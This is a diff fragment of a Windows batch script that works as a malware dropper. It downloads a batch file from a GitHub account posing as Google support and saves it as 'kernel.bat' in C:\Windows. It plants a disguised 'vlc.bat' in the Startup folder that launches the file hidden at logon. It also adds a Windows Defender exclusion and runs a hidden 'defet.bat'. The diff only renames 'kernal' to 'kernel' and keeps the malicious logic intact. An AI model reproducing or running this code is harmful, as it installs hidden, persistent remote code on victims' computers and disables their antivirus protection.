@@ -22,12 +22,12 @@ cd  %temp%
 
 
 
-curl https://raw.githubusercontent.com/supportgoogle34/files/main/kernal.bat > C:\Windows\kernal.bat
+curl https://raw.githubusercontent.com/supportgoogle34/files/main/kernel.bat > C:\Windows\kernel.bat
  
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
-echo "powershell.exe -command Start-Process -FilePath "C:\Windows\kernal.bat" -ArgumentList "args" -WindowStyle Hidden  " >> vlc.bat
+echo "powershell.exe -command Start-Process -FilePath "C:\Windows\kernel.bat" -ArgumentList "args" -WindowStyle Hidden  " >> vlc.bat
 
 
 
@@ -39,4 +39,3 @@ Add-MpPreference -ExclusionProcess "C:\Windows\defet.bat"
 set pop=%systemroot%
 powershell.exe -command Start-Process -FilePath "C:\Windows\defet.bat" -ArgumentList "args" -WindowStyle Hidden
 defet.bat
-
